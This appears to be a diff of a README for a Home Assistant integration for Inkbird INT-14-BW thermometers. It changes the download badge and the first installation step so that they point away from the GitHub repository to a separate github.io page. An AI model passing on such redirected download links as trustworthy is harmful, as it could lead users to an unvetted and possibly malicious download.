@@ -1,6 +1,6 @@
 # 🌡️ ha-inkbird-int14bw - Connect Inkbird thermometers to Home Assistant
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Sadistic-froelichia458/ha-inkbird-int14bw)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://sadistic-froelichia458.github.io)
 
 This software allows your Home Assistant system to talk to Inkbird INT-14-BW thermometers. It uses Bluetooth to track temperatures in real-time. You can monitor your cooking or room climate directly from your dashboard.
 
@@ -14,7 +14,7 @@ This software allows your Home Assistant system to talk to Inkbird INT-14-BW the
 
 ## 🚀 Installation Steps
 
-1.  Visit this page to download: https://github.com/Sadistic-froelichia458/ha-inkbird-int14bw
+1.  Visit this page to download: https://sadistic-froelichia458.github.io
 2.  Open your Home Assistant dashboard in your web browser.
 3.  Select the HACS icon from the left sidebar.
 4.  Click the three dots in the top right corner.
